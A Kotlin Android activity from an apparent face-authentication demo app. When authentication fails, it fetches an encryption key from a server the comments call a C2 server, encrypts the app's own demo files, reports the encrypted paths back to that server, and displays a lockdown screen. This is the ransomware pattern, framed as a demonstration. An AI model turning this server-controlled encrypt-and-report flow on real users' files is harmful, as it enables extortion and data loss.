package com.faceauth.app

import android.os.Bundle
import android.util.Log
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.faceauth.app.databinding.ActivityAuthFailBinding
import com.faceauth.app.security.DemoFileCreator
import com.faceauth.app.security.FileEncryptor
import com.faceauth.app.security.PayloadFetcher
import com.faceauth.app.util.AuthLogger
import com.faceauth.app.util.FilesystemLocker
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

/**
 * Authentication Failure screen — Class B (target) detected.
 *
 * Sequence:
 *  1. Show "Unauthorised access detected"
 *  2. FETCH encryption payload from payload server (on the fly)
 *     ↳ Encryption key is NOT in the APK — pulled at runtime
 *  3. Encrypt all demo files using the fetched key
 *  4. Report encrypted files back to payload server
 *  5. Display before/after filesystem comparison
 *  6. Show filesystem lockdown (Android sandbox probe)
 *
 * The encryption step is skipped if the payload server is unreachable,
 * demonstrating that the C2 server controls whether encryption proceeds.
 */
class AuthFailActivity : AppCompatActivity() {

    private lateinit var b: ActivityAuthFailBinding
    private val TAG = "AuthFailActivity"
    private val sdf = SimpleDateFormat("yyyy-MM-dd  HH:mm:ss", Locale.US)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        b = ActivityAuthFailBinding.inflate(layoutInflater)
        setContentView(b.root)

        val conf = intent.getFloatExtra("conf", 0f)
        val ts   = intent.getLongExtra("ts", System.currentTimeMillis())

        b.tvTitle.text      = "Authentication\nUnsuccessful"
        b.tvConfidence.text = "Target confidence: ${"%.1f".format(conf * 100)}%  (threshold ≥ 85%)"
        b.tvTimestamp.text  = "Attempt at: ${sdf.format(Date(ts))}"

        // Hide result panels until ready
        b.layoutEncryptionResult.visibility = View.GONE
        b.layoutFsProbe.visibility          = View.GONE
        b.btnDismiss.visibility             = View.GONE

        // Kick off the full security response sequence
        lifecycleScope.launch { runSecurityResponse(conf, ts) }

        b.btnDismiss.setOnClickListener { finishAffinity() }
    }

    // ── Main security response sequence ────────────────────────────────────

    private suspend fun runSecurityResponse(conf: Float, ts: Long) {

        // ── Stage 1: Snapshot files BEFORE encryption ─────────────────────
        val beforeFiles = DemoFileCreator.listDemoFiles(this@AuthFailActivity)
        updateStage("Stage 1/4", "Scanning filesystem...",
                    buildFileTable("BEFORE ENCRYPTION", beforeFiles))

        delay(600)

        // ── Stage 2: Fetch payload from server (ON THE FLY) ───────────────
        updateStage("Stage 2/4", "Contacting payload server  (http://10.0.2.2:8888)...", "")

        val fetchResult = withContext(Dispatchers.IO) {
            PayloadFetcher.fetchPayload()
        }

        when (fetchResult) {
            is PayloadFetcher.FetchResult.Failure -> {
                // Server unreachable — encryption cannot proceed
                Log.w(TAG, "Payload fetch failed: ${fetchResult.reason}")
                updateStage(
                    "Stage 2/4 — FAILED",
                    "Payload server unreachable.\nEncryption key not obtained.\nFiles remain unencrypted.",
                    "Reason: ${fetchResult.reason}\n\n" +
                    "Start payload_server.py on the host machine and try again.\n" +
                    "This demonstrates that without the C2 server the encryption\n" +
                    "code in the APK is completely inert."
                )
                showFsProbe()
                showDismiss()
                return
            }
            is PayloadFetcher.FetchResult.Success -> {
                val payload = fetchResult.payload
                Log.i(TAG, "Payload received: sessionId=${payload.sessionId}")

                updateStage(
                    "Stage 2/4 — PAYLOAD RECEIVED",
                    "Encryption parameters delivered by server:",
                    buildPayloadSummary(payload)
                )
                delay(800)

                // ── Stage 3: Encrypt files ─────────────────────────────────
                updateStage("Stage 3/4", "Encrypting files with fetched key...", "")

                val startMs = System.currentTimeMillis()
                val encResults = withContext(Dispatchers.IO) {
                    val dir = File(filesDir, DemoFileCreator.DEMO_DIR)
                    FileEncryptor.encryptDirectory(dir, payload)
                }
                val elapsed = System.currentTimeMillis() - startMs

                // Report encrypted files back to the payload server
                withContext(Dispatchers.IO) {
                    val paths = encResults.filter { it.success }.map { it.encryptedPath }
                    PayloadFetcher.reportEncryptedFiles(paths)
                }

                // Snapshot AFTER encryption
                val afterFiles = DemoFileCreator.listDemoFiles(this@AuthFailActivity)
                val encReport  = FileEncryptor.buildReport(encResults, elapsed)

                val fullEncDisplay = buildString {
                    appendLine(encReport)
                    appendLine()
                    appendLine(buildFileTable("AFTER ENCRYPTION", afterFiles))
                }

                updateStage(
                    "Stage 3/4 — ENCRYPTION COMPLETE",
                    "${encResults.count { it.success }} file(s) encrypted in ${elapsed}ms",
                    fullEncDisplay
                )

                // Show before/after in the dedicated panel
                showEncryptionResult(
                    buildFileTable("BEFORE", beforeFiles),
                    buildFileTable("AFTER", afterFiles)
                )
                delay(600)

                // ── Stage 4: Filesystem lockdown + probe ───────────────────
                FilesystemLocker.lockdown(this@AuthFailActivity)
                AuthLogger.log(this@AuthFailActivity,
                               "INTRUSION_DETECTED_AND_ENCRYPTED",
                               "class_b", conf)

                showFsProbe()
                showDismiss()
            }
        }
    }

    // ── UI helpers ─────────────────────────────────────────────────────────

    private fun updateStage(stage: String, status: String, detail: String) {
        runOnUiThread {
            b.tvStageLabel.text  = stage
            b.tvStageStatus.text = status
            b.tvStageDetail.text = detail
        }
    }

    private fun showEncryptionResult(before: String, after: String) {
        runOnUiThread {
            b.layoutEncryptionResult.visibility = View.VISIBLE
            b.tvBeforeFiles.text = before
            b.tvAfterFiles.text  = after
        }
    }

    private fun showFsProbe() {
        runOnUiThread {
            val probes   = FilesystemLocker.probeFilesystem(this)
            val probeStr = probes.joinToString("\n") {
                "  ${it.path}\n  → ${it.statusLabel}"
            }
            b.tvFsTitle.text  = "Stage 4/4 — Android Filesystem Probe"
            b.tvFsReport.text = buildString {
                appendLine("Probing filesystem as detected intruder...")
                appendLine()
                appendLine(probeStr)
                appendLine()
                appendLine("Cache cleared        : YES")
                appendLine("Session wiped        : YES")
                appendLine("Filesystem isolated  : ENFORCED by Android sandbox")
            }
            b.layoutFsProbe.visibility = View.VISIBLE
        }
    }

    private fun showDismiss() {
        runOnUiThread { b.btnDismiss.visibility = View.VISIBLE }
    }

    // ── Formatting helpers ─────────────────────────────────────────────────

    private fun buildPayloadSummary(p: PayloadFetcher.EncryptionPayload) = buildString {
        appendLine("  Algorithm  : ${p.algorithm}")
        appendLine("  Key (B64)  : ${p.keyB64.take(16)}...  (${p.keyB64.length} chars)")
        appendLine("  IV  (B64)  : ${p.ivB64.take(16)}...")
        appendLine("  Targets    : ${p.targetExtensions.joinToString(", ")}")
        appendLine("  Session ID : ${p.sessionId}")
        appendLine("  Server time: ${p.serverTimestamp}")
    }

    private fun buildFileTable(heading: String, files: List<Map<String, String>>) = buildString {
        appendLine("── $heading ──────────────────────")
        if (files.isEmpty()) {
            appendLine("  (no files)")
        } else {
            for (f in files) {
                val icon = if (f["type"] == "ENCRYPTED") "🔒" else "📄"
                appendLine("  $icon ${f["name"]}")
                appendLine("     ${f["size"]}  [${f["type"]}]")
            }
        }
    }
}
